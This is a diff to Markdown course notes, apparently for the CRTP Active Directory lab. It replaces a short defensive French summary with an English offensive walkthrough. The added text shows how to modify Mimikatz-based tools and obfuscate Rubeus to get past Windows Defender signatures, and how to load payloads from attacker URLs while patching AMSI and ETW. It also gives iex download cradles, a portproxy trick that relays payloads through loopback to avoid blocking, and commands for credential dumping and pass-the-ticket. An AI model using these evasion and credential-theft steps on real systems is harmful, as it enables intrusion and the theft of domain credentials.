@@ -1,93 +1,214 @@
+---
+title: "4 - Offensive .NET"
+---
+
 # Offensive .NET
 
-Le chapitre source étudie les outils C#/.NET utilisés dans les exercices CRTP, les mécanismes de détection et la livraison d'assemblies.
+**A repo of popular Offensive C# tools**:
 
-## Détection par signature
+[SharpCollection on GitHub](https://github.com/Flangvik/SharpCollection)
 
-Les notes présentent DefenderCheck, SharpKatz, SafetyKatz, BetterSafetyKatz et Rubeus dans le contexte de la détection de signatures. L'obfuscation et la manipulation de chaînes compliquent certaines détections statiques ; elles ne garantissent pas l'absence de détection comportementale.
+[Mimikatz on GitHub](https://github.com/gentilkiwi/mimikatz)
 
-## Chargement d'assemblies
 
-Le document aborde NetLoader et AssemblyLoad, ainsi que les mécanismes AMSI, ETW et la journalisation. Ces sujets sont étudiés ici sous l'angle des surfaces d'exécution et des contrôles de sécurité.
+## Tradecraft - AV bypass
 
-## Constrained Language Mode
+> We will focus mostly on bypass of signature based detection by Windows Defender
+
+For that, we can use techniques like Obfuscation, String Manipulation etc.
+
+We can use DefenderCheck:
+
+[DefenderCheck on GitHub](https://github.com/matterpreter/DefenderCheck)
+
+> To identify code and strings from a binary that Windows Defender may flag.
+
+This helps us in deciding on modifying the source code and minimal obfuscation.
+
+
+### SharpKatz
+
+Let's check SharpKatz.exe for signatures using DefenderCheck
+```powershell
+DefenderCheck.exe <Path to Sharpkatz binary>
+```
+
+- Open the project in Visual Studio.
+- Press **CTRL + H**
+- Find and replace the string "Credentials" with "Credents" you can use any other string as an replacement. (Make sure that string is not present in the code)
+- Select the scope as **Entire Solution**.
+- Press **Replace All** button.
+- Build and recheck the binary with *DefenderCheck*.
+- Repeat above steps if still there is detection
+
+### Safetykatz
+
+For SafetyKatz, we used the following steps
+- Download latest version of Mimikatz and **Out-CompressedDll.ps1**
+
+Run the Out-CompressedDll.ps1 PowerShell script on Mimikatz binary and save the output to a file
+```powershell
+Out-CompressedDll <Path to mimikatz.exe> > 	outputfilename.txt
+```	
+
+[Out-CompressedDll.ps1 in PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1)
+
+
+- Copy the value of the variable **$EncodedCompressedFile** from the output file above and replace the value of **compressedMimikatzString** variable in the **Constants.cs** file of SafetyKatz.
+
+- Copy the byte size from the output file and replace it in **Program.cs** file on the line 111 & 116.
+- Build and recheck the binary with *DefenderCheck*
+
+### BetterSafetyKatz
+
+For BetterSafetyKatz, we used the following steps
+- Download the latest release of "mimikatz_trunk.zip" file.
+- Convert the file to base64 value
+
+![Alt text](./assets/3.png)
+
+
+
+
+Modify the **Program.cs** file.
+
+– Added a new variable that contains the base64 value of **mimikatz_trunk.zip** file.
+– Comment the code that downloads or accepts the mimikatz file as an argument.
+– Convert the base64 string to bytes and pass it to **zipStream** variable
+
+![Alt text](./assets/4.png)
+
+
+
+
+### Rubeus
+
+For Rubeus.exe, we used **ConfuserEx** to obfuscate the binary
+
+[ConfuserEx on GitHub](https://github.com/mkaring/ConfuserEx)
+
+
+Launch ConfuserEx:
+- In Project tab select the Base Directory where the binary file is located.
+- In Project tab Select the Binary File that we want to obfuscate.
+- In Settings tab add the rules.
+- In Settings tab edit the rule and select the preset as **Normal**.
+- In Protect tab click on the protect button.
+
+> We will find the new obfuscated binary in the Confused folder under the Base Directory.
+
+![Alt text](./assets/5.png)
+
+
+
+- After obfuscating the binary with ConfuserEx rescan using DefenderCheck we can see the detection of GUID.
+- Generate and modify the GUID and compile Rubeus again and rerun the ConfuserEx on the Rubeus.exe binary.
+
+![Alt text](./assets/6.png)
+
+
+
+## Payload Delivery     
+
+
+We can use NetLoader to deliver our binary payloads.
+
+[NetLoader on GitHub](https://github.com/Flangvik/NetLoader)
+
+
+It can be used to load binary from filepath or URL and patch AMSI & ETW while executing:
+```powershell
+C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
+```
+
+We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL:
+```powershell
+C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
+```
+
+### [1] - Getting DA through dcorp-ci
+```powershell
+iex (iwr http://<ip>/sbloggingbypass.txt -UseBasicParsing)
+# bypass ASMI manually
+iex ((New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1'))
+FInd-DomainUserLocation
+winrs -r:<machine> <command> //example winrs -r:dcorp-mgmt hostname;whoami
+iwr http://<ip>/Loader.exe -OutfFile C:\Users\Public\Loader.exe
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+
+> [NOTE] Windows Defender will block all binaries/executables that are downloaded from remote sources
+So, we will configure a portforward to request payload from local loopback. 
+
+> Even if Defender is watching this, because is not remotely the payload its not blocked
+
+```powershell
+$null | winrs -r:dcorp-mgmt “netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker IP>”
+$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+```
+
+Create a new PS with high integrity:
+```powershell
+Rubeus.exe asktgt /user:svcadmin /aes256:<dc hash> /opsec /creanetonly:C:\windows\System32\cmd.exe /show /ptt
+```
+
+
+### [2] - Getting DA through derivative local admin
+
+```powershell
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess -Verbose
+
+Enter-PSSession <the machine we have local admin access>
+```
+
+> we have to bypass AMSI here, but the shell is in **ConstrainedLanguage** Mode
 
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
 ```
 
-Affiche le mode de langage PowerShell de la session courante.
-
-## AppLocker
-
-### Politique effective
-
+> we need to search what kind o policy is blocking us : **applocker**, **wdigest**
+ 
+ ```powershell  
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+or
 ```powershell
-Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2 # "AppLocker = Software Restrict Policy Version 2"
 ```
 
-Affiche les collections de règles de la politique effective.
+Lets copy mimiEx to the target machine
 
-### Configuration du registre
-
-```cmd
-reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
-```
-
-Consulte la configuration AppLocker accessible dans le registre.
-
-## Identification de la session
-
-Les deux commandes suivantes sont extraites des exemples de diagnostic du document de 2023 et présentées séparément.
-
-### Identifier la machine
-
-```cmd
-hostname
-```
-
-Affiche le nom de la machine sur laquelle la commande est exécutée.
-
-### Identifier le compte courant
-
-```cmd
-whoami
-```
-
-Affiche l'identité Windows de la session courante.
-
-## Compléments d'audit
-
-Ces vérifications de configuration et de journalisation complètent les notes originales ; elles ne figurent pas dans le document de 2023.
-
-### État de Microsoft Defender
-
+From attacker:
 ```powershell
-Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated
+Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
-Consulte l'état de l'antivirus, de la protection en temps réel et la date de mise à jour des signatures. Nécessite le module Defender.
+> Enter the machine again with PSSession and execute the MimiEx.ps1
 
-### Journal AppLocker
 
+From attacker:
 ```powershell
-Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' -MaxEvents 20
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe “sekurlsa::opassth” /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<hash> /run:cmd.exe" “exit”
 ```
 
-Consulte les vingt événements les plus récents du journal AppLocker EXE and DLL, si le journal est disponible et accessible.
+- This will open a shell with the hash we got with **mimiEx**
+- Firstly found what machines this user has local admin access
 
-### Journal PowerShell
+> [EXTRA] **Session: Service From 0** = means that there is a service using the account as a service account
+> so, there is a chance of cached cleartext password on mimikatz results
 
+
+
+In the new shell:
 ```powershell
-Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 20
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess -Verbose
 ```
 
-Consulte les vingt événements opérationnels PowerShell les plus récents. Les événements disponibles dépendent de la configuration de journalisation.
+> At this point, we can access dump the credentials like we did before in the last path
+> Opening a portforward and dump through local loopback                                          ]
 
-## Points de contrôle
-
-- Politique de contrôle des applications.
-- Restrictions PowerShell.
-- Journalisation des scripts.
-- Contrôle des assemblies et des binaires.
-- Analyse des chemins d'administration privilégiée.
